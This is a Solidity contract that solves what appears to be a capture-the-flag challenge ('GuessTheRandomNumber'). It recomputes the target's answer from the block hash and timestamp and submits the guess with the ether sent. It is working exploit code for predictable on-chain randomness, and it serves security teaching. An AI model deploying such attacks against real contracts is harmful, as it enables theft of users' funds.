// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { GuessTheRandomNumberChallenge } from "../challenges/06_GuessTheRandomNumber/GuessTheRandomNumberChallenge.sol";

contract GuessTheRandomNumberAttack {
    function attack(
        GuessTheRandomNumberChallenge target,
        uint256 blockNumber,
        uint256 blockTimestamp
    ) external payable {
        uint8 answer = getAnswer(blockNumber, blockTimestamp);
        target.guess{ value: msg.value }(answer);
    }

    function getAnswer(uint256 blockNumber, uint256 blockTimestamp) public view returns (uint8) {
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber), blockTimestamp))));
    }

    receive() external payable {}
}
